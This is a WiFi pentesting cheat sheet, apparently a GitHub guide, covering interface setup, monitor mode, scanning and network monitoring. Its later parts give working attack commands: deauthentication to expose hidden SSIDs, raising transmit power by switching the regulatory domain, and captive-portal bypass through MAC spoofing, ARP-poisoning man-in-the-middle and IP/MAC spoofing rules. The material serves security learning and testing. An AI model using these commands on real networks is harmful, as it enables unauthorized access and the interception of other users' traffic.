## Index

- [Interfaces Management](https://github.com/NeverWonderLand/Self-Way/blob/main/Guide/CS_wireless/Wireless.md#wifi-interfaces-management)
- [Connections](https://github.com/NeverWonderLand/Self-Way/blob/main/Guide/CS_wireless/Wireless.md#wifi-connection)
- [Monitoring](https://github.com/NeverWonderLand/Self-Way/blob/main/Guide/CS_wireless/Wireless.md#wifi-monitoring)
- [Hotspot Captive Portal Bypass](https://github.com/NeverWonderLand/Self-Way/blob/main/Guide/CS_wireless/Wireless.md#hotspot-captive-portal-bypass)

</br>

# WiFi Interfaces Management
</br>

## List Available WiFi Interfaces
```
ip link show
iwconfig
```

## Check Channels Supported by WiFi card
```
iwlist chan
iwlist <interface> chan
```

## Get Full Technical Info about Device
Get info such as:
* Supported channels/frequencies
* Supported bandwidths
* Supported interface modes (e.g. AP, monitor...)
```
iw dev # to get phy# value
iw phy phy<value> info # value is 0, 1, 2...
```
To get technical info about all WiFi interfaces
```
iw list
```

## Increase WiFi TX Power
Does not work on every WiFi card
```
iw reg set B0  # Set regulatory domain to Bolivia
iwconfig wlan0 txpower 30  # Put interface TX Power to 30 Dbm
```
If returns an error, try second method
```
ifconfig wlan0 down
iw reg set BO
ifconfig wlan0 up
iwconfig wlan0 channel 13
iwconfig wlan0 txpower 30
```
Alternative method
```
iw wlan0 set txpower fixed 3000
```

## Set Interface in Monitor Mode
Manual method
```
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
iw dev mon0 set channel <channel>  # Set the interface on a specific channel
iw dev mon0 info  # Check interface status
```
Automatic method
```
airmon-ng start wlan0
```
Note: In some cases, some processes (e.g. NetworkManager, wpa_supplicant) might interfere with other tools from aircrack-ng suite. 
* They can be all killed using:
```
airmon-ng check kill
```
Delete interface in monitor mode
```
iw dev wlan0 del
```

## List Devices in Monitor Mode
```
iwconfig | grep -i monitor
```

## Test Card is Working Well in Monitor Mode
```
airodump-ng wlan1 --band ag -M -U --wps --beacons -w captureallthewireless
# --band a for 5Ghz
# --band g for 2.4 GHz

#ifconfig wlan0
#aireplay-ng wlan0 -9
10:09:24 Trying broadcast probe requests..
```
`--band <abg>`: 'b' and 'g' uses 2.4GHz and 'a' uses 5GHz

## Injection Test
Test if WiFi device can perform injection
```
aireplay-ng -9 mon0
aireplay-ng -9 -i mon0 mon1  # Attack (replay) tests (with 2 wifi cards in monitor mode)
```

## Control Channel & Bandwidth of Interface in Monitor Mode
Check interface channel & frequency info
```
iw dev wlan0 info | grep channel
```
Set interface to specific channel & to bandwidth = 40MHz
```
iw dev wlan0 set channel <channel_number> HT40+
iw dev wlan0 set channel <channel_number> HT40-
```
Change interface channel
```
iwconfig <interface> channel <channel_number>
```

</br>

# WiFi Connection

## Scan for WiFi Networks (Active Scanning)
```
iw dev
ip link show wlan0
ip link set wlan0 up
iw wlan0 link
iw wlan0 scan
iw wlan0 scan | grep "SSID:"  # Clean output of SSIDs
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA"
```
Alternative
```
iwlist wlan0 scanning
```

## Connect to Open WiFi Network (unsecured)
```
iwconfig wlan0 essid <SSID>
ifconfig wlan0 up
dhclient -v wlan0
```

## Connect to WEP Network
```
iwconfig wlan0 essid <SSID> key <key>
ifconfig wlan0 up
dhclient -v wlan0
```

## Connect to WPA PSK Network
```
wpa_passphrase <SSID> <passphrase> >> /etc/wpa_supplicant.conf
wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant.conf
dhclient -v wlan0
ping 8.8.8.8
```

</br>

# WiFi Monitoring

## Perfom channel hopping among various channels. Scan 2.4GHz (default)
```
airodump-ng mon0
```
Perfom channel hopping among various channels. Scan 5GHz
```
airodump-ng --band a mon0
```
Monitor specific channel(s)
```
airodump-ng -c <channel> mon0
airodump-ng -c <chan1>,<chan2> mon0  # Monitoring with channel hopping on specified channels
```
Monitor specific AP, write dump to file
```
airodump-ng -c <channel> --bssid <MAC_AP> -w <capture_file> mon0
```

## Generate Graph Images of Monitored WiFi
Generate graph of WiFi connections around (APs and clients connected to APs)
```
airodump-ng -r targetnet.pcap -w TARGETNET
airgraph-ng -i TARGETNET-01.csv -g CAPR -o targetnet-connections.png
```
Generate graph of probe requests sent by devices around (Very interesting to rebuild devices' PNLs)
```
airodump-ng -r targetnet.pcap -w TARGETNET
airgraph-ng -i TARGETNET-01.csv -g CPG -o targetnet-pnl.png
```
Alternative with BeaconGraph: https://github.com/daddycocoaman/BeaconGraph

## Monitor WiFi Networks with Kismet (nice all-in-one WEB UI)
```
kismet -c mon0
```

## Find Hidden SSID
```
airodump-ng –c <channel> --bssid <MAC_AP> mon0
aireplay-ng -0 20 –a <MAC_AP> mon0
```

## Determine WPA/WPA2-Enterprise EAP type
Capture an EAP Handhshake
```
airodump-ng -c <channel> --bssid <MAC_AP> -w <capture_file> mon0
```
* Analyze EAP handshake packet capture with Wireshark:
* * Filter on "eap"
* * Check field "Type" in EAP message

</br>

# Hotspot Captive Portal Bypass

## MAC based authorization
1. Sniff network to find an authorized client identified by his MAC address
2. Change interface MAC address:
```
ifconfig wlan0 hw ether <authorized_MAC_address>
```

## IP based authorization

### Method 1: MiTM
1. Activate IP forwarding:
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
2. MiTM (ARP cache poisoning) between gateway & authorized client:
```
ettercap -T -q -i wlan0 -w dump -M ARP /<IP_authorized_client>/ /<IP_gateway>/
```
3. All packets sent from the attacker will have to spoof the authorized client IP except for packets going in the LAN:
```
iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT --to <IP_authorized_client>
```
4. Increments TTL:
```
iptables -t mangle -A FORWARD -d <IP_authorized_client> -j TTL --ttl-inc 1
```

### Method 2: Inactive users
Spoof IP address of authorized client who has become inactive on hotspot (tool https://github.com/codewatchorg/cpscam):
```
perl cpscam.pl <interface> <ListenIP> <SubnetMask> <InactivityTimeout> <CaptiveLogoffURL>
```

## IP+MAC based authorization
1. Turn interface into bridge mode:
```
modprobe bridge
brctl addbr br0
brctl addif br0 <interface>
```
2. All frames sent by attacker to the gateway will have a spoofed source MAC address:
```
ebtables -t nat -A POSTROUTING -o <interface> -d <MAC_gateway> -j snat --to-source <MAC_authorized_client>
```
3. Apply IP based authorization bypass - Method 1 (MiTM) (cf. before).

</br>

